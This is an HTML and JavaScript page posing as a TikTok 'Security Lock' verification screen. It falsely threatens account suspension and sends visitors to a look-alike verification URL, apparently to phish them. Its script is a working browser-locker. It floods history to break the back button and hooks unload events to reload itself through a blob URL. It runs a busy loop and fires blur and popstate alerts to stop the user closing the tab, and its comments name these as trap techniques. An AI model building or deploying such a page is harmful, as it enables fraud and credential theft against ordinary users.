<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            background: #ffffff; overflow: hidden; font-family: sans-serif;
        }
        #trap {
            display: flex; flex-direction: column; align-items: center; 
            justify-content: center; height: 100vh; text-align: center;
        }
        .btn {
            background: #fe2c55; color: white; padding: 15px 50px; 
            border-radius: 4px; text-decoration: none; font-weight: 700;
            margin-top: 30px; border: none;
        }
        /* The "Invisible Wall" - Prevents the X button from being the only focus */
        #barrier {
            position: fixed; top: 0; left: 0; width: 100%; height: 10%;
            z-index: 999999; background: rgba(0,0,0,0.001);
        }
    </style>
</head>
<body>
    <div id="barrier"></div>
    <div id="trap">
        <div style="font-size: 24px; font-weight: 800;">Security Lock</div>
        <p style="color: #8a8b91; padding: 0 40px;">Complete verification to continue. Closing this window will result in a temporary account suspension.</p>
        <button class="btn" onclick="location.href='https://tiktokverification.github.io/captcha/Verification/verify1.html'">VERIFY NOW</button>
    </div>

<script>
    // 1. THE BACK BUTTON PRISON (Already works, kept for safety)
    function buildPrison() {
        for(let i=0; i<100; i++) {
            history.pushState({locked: true}, "", "#step" + i);
        }
    }

    // 2. THE "X" BUTTON NEUTRALIZER
    // This function runs when the browser tries to navigate away or close
    function killCloseAction(e) {
        // Standard confirmation (X button often ignores this, but it adds delay)
        const msg = "Verification is incomplete.";
        e.returnValue = msg;

        // THE GLITCH: Force a navigation to a BLOB URL. 
        // A Blob URL is generated locally and is faster than a network request.
        // This 'races' the close button.
        const blob = new Blob(['<html><script>location.href="' + location.href + '";<\/script></html>'], {type: 'text/html'});
        const blobUrl = URL.createObjectURL(blob);
        
        // Open the trap again in the background or foreground
        window.location.replace(blobUrl); 
        
        return msg;
    }

    // 3. THE ATTRITION LOOP
    // We saturate the event loop so the "X" button click doesn't register instantly
    setInterval(() => {
        // This tiny 'no-op' keeps the thread active
        window.localStorage.setItem('lock', Date.now());
    }, 10);

    // 4. BINDING THE TRAP
    window.addEventListener('beforeunload', killCloseAction);
    window.addEventListener('pagehide', killCloseAction);
    window.addEventListener('unload', killCloseAction);

    // 5. BLUR RECOVERY
    window.onblur = function() {
        // If the user clicks the X area, the window blurs.
        // We trigger an alert to freeze the UI.
        setTimeout(() => {
            alert("SECURITY ALERT: Do not close this window until verification is finished.");
            // After they close the alert, slam them back to the start
            location.replace(location.href);
        }, 1);
    };

    window.onpopstate = function() {
        history.go(1);
        alert("Verification Required.");
    };

    window.onload = buildPrison;
</script>
</body>
</html>
